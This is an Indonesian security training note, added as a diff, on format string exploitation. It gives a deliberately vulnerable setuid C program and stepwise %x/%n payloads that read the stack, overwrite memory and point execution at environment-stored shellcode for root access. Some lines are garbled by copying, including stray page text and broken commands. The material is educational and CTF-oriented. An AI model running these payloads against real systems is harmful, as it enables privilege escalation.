@@ -1,0 +1,238 @@
+__/\\\________/\\\_____/\\\\\\\\\\\____/\\\___________________/\\\\\__________/\\\\\\\\\\\___        
+ _\/\\\_____/\\\//____/\\\/////////\\\_\/\\\_________________/\\\///\\\______/\\\/////////\\\_       
+  _\/\\\__/\\\//______\//\\\______\///__\/\\\_______________/\\\/__\///\\\___\//\\\______\///__      
+   _\/\\\\\\//\\\_______\////\\\_________\/\\\______________/\\\______\//\\\___\////\\\_________     
+    _\/\\\//_\//\\\_________\////\\\______\/\\\_____________\/\\\_______\/\\\______\////\\\______    
+     _\/\\\____\//\\\___________\////\\\___\/\\\_____________\//\\\______/\\\__________\////\\\___   
+      _\/\\\_____\//\\\___/\\\______\//\\\__\/\\\______________\///\\\__/\\\_____/\\\______\//\\\__  
+       _\/\\\______\//\\\_\///\\\\\\\\\\\/___\/\\\\\\\\\\\\\\\____\///\\\\\/_____\///\\\\\\\\\\\/___ 
+        _\///________\///____\///////////_____\///////////////_______\/////_________\///////////_____
+
+CATATAN PELATIHAN KSLOS 25/04/2016, LN08v1a.txt
+Latihan 08 : Pengenalan BE & RE 3 
+              Format String & decompiler
+
+--------| Pendahuluan
+
+Format string exploit tujuannya sama seperti teknik exploit lain yaitu
+mendapatkan kontrol dari program (mendapatkan root). Seperti exploit
+buffer overflow, format string exploit juga bergantung pada kesalahan
+programming yang tidak terlalu "terlihat". Celah format string sudah
+tidak banyak lagi, namun teknik yang dibawah bisa dilakukan pada situasi
+lain dan CTF.
+
+--------| Format String?
+
+Semestinya kita sudah mengenal tentang basis format string. Format string
+digunakan saat kita menggunakan fungsi seperti printf(). Fungsi printf()
+mengevaluasi format string yang ada lalu melakukan aksi setiap ada format
+string yang ditemui. Setiap format parameter memerlukan variabel yang berkesi
+nambungan, misalnya ada 3 format parameter pada format string, harus ada
+3 argumen pada fungsi printf().
+
+Pada C, format parameternya:
+
+%d Value Decimal
+%u Value Unsigned decimal
+%x Value Hexadecimal
+%s Pointer String
+%n Pointer Number of bytes written so far
+
+
+--------| Kode C untuk latihan
++ fmt_uncommon.c
+
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+int A = 5, B = 7, count_one, count_two;
+// Example of a %n format string
+printf("The number of bytes written up to this point X%n is being stored in
+count_one, and the number of bytes up to here X%n is being stored in
+count_two.\n", &count_one, &count_two);
+printf("count_one: %d\n", count_one);
+printf("count_two: %d\n", count_two);
+// Stack example
+printf("A is %d and is at %08x. B is %x.\n", A, &A, B);
+exit(0);
+}
+
+--------| %n 
+
+Format parameter %n dibilang unik, karena ia tidak menampilkan sesuatu namun
+menyimpan data yang berisi berpaa bytes yang sudah ditampilkan.
+
+--------| Kasus unik
+
+Bagaimana jika ada 3 format parameter, namun hanya ada 2 argumen?
+Seperti contoh di atas :
+
+  printf("A is %d and is at %08x. B is %x.\n", A, &A);
+
+--------| Contoh Kode C 2
+fmt_vuln.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+char text[1024];
+static int test_val = -72;
+if(argc < 2) {
+printf("Usage: %s <text to print>\n", argv[0]);
+exit(0);
+}
+strcpy(text, argv[1]);
+printf("The right way to print user-controlled input:\n");
+printf("%s", text);
+printf("\nThe wrong way to print user-controlled input:\n");
+printf(text);
+printf("\n");
+// Debug output
+printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val,
+test_val);
+exit(0);
+}
+
++---------------------------------------
+$ gcc -o fmt_vuln fmt_vuln.c
+$ sudo chown root:root ./fmt_vuln
+$ sudo chmod u+s ./fmt_vuln
+$ ./fmt_vuln testing
++---------------------------------------
+
+Coba ini : 
+
++---------------------------------------
+$ ./fmt_vuln testing%x
+$ ./fmt_vuln $(perl -e 'print "%08x."x40')
+$ printf "\x25\x30\x38\x78\x2e\n"
++---------------------------------------
+
+Lalu apa itu 0x2e78383025? Setelah diteliti ternyata string hexa itu adalah
+"%08x.". Seperti yang kita lihat, itu adalah format string itu sendiri. Karena
+fungsi format akan selalu berada pada stack frame dengan memori address paling 
+tinggi. Selama format string sudah disimpan dalam stack, ia akan diletakkan 
+dibawah frame pointer saat itu(artinya lebih tinggi memory adddressnya). Fakta
+ini penting untuk mengkontrol argumen pada format function.
+
++---------------------------------------
+$ ./fmt_vuln AAAA%08x.%08x.%08x.%08x
++---------------------------------------
+
+
+--------| Melihat environment linux di format string
+
++---------------------------------------
+$ env | grep PATH
+$ ./getenvaddr PATH ./fmt_vuln
+$ ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s
++---------------------------------------
+
+Disini program getenvaddr digunakan untuk mengetahui address dari environment
+variable PATH (lihat alasannya di bab Menggunakan Environment Linux).
+
+
+
+--------| Menulis ke memori yang "sembarangan"
+
++---------------------------------------
+$ ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08")%08x.%08x.%08x.%n
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%x%n
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%100x%n
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%180x%n
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%400x%n
++---------------------------------------
+
+
+Sebagai contoh, cobalah untuk menulis address 0xDDCCBBAA ke test variable.
+Maka yang pertama kali ditulis adalah 0xAA, lalu 0xBB, 0xCC, 0xDD. Akan
+ditulis ke 4 memori address yaitu 0x08049794 , 0x08049795 , 0x08049796 , 
+dan 0x08049797.
+
+Contoh :
++---------------------------------------
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%8x%n
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%150x%n
+$
++---------------------------------------
+
+
++---------------------------------------
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\
+x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%8x%n
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\
+$ gdb -q --batch -ex "p 0xbb - 0xaa"
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\
+x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n%17x%n
+
+$ gdb -q --batch -ex "p 0xcc - 0xbb"
+$ gdb -q --batch -ex "p 0xdd - 0xcc"
+$ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\
+x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n%17x%n%17x%n%17x%n
+$
++---------------------------------------
+
+Dengan mengontrol LSB dan melakukan 4 kali write, sebuah address dapat
+kita tulis dengan mudah ke memori address apapun.
+
+Contoh realnya : 
+
+  + Ada program suid, kita dapat meletakkan suatu shellcode ke dalam 
+    env. Lalu tuliskan memori address env tersebut ke suatu memori 
+    address yang akan dilalui program tersebut.
+
+  + Pada kontes CTF, ada program yang menyembunyikan suatu fungsi.
+    Fungsi tersebut tentu saja berisi flag. Kita bisa melakukan teknik
+    di atas untuk "melompat" langsung ke fungsi tsb.
+
+
+--------| Kasus Lain
+
++---------------------------------------
+$ sed -e 's/72;/72, next_val = 0x11111111;/;/@/{h;s/test/next/g;x;G}'
+fmt_vuln.c > fmt_vuln2.c
++---------------------------------------
+
+--------| Menggunakan environment Linux
+
+Terkadang sebuah buffer terlalu kecil untuk menyimpan sebuah shellcode.
+Shellcode tersebut ternyata dapat ditanam di environment linux. Environment
+di linux akan terletak di memori segmen Stack.
+
++---------------------------------------
+$ export MYVAR=test
+$ echo $MYVAR
+$ env
++---------------------------------------
+
+
+
++ getenvaddr.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+Ex pl oit a ti on
+147int main(int argc, char *argv[]) {
+char *ptr;
+if(argc < 3) {
+printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+exit(0);
+}
+ptr = getenv(argv[1]); /* Get env var location. */
+ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
+printf("%s will be at %p\n", argv[1], ptr);
+}
+
++---------------------------------------
+$ export SHELLCODE=$(cat shellcode.bin)
+$ ./getenvaddr SHELLCODE ./fmt_vuln
+$ ./fmt_vuln $(printf "\x96\x96\x04\x08\x94\x96\x04\
+x08")%49143x%4\$hn%14829x%5\$hn
++---------------------------------------
+
+--------|Links&Referensi
+Hacking : Art Of Exploitation 2nd version*
+
+
+*: rekomendasi untuk dibaca
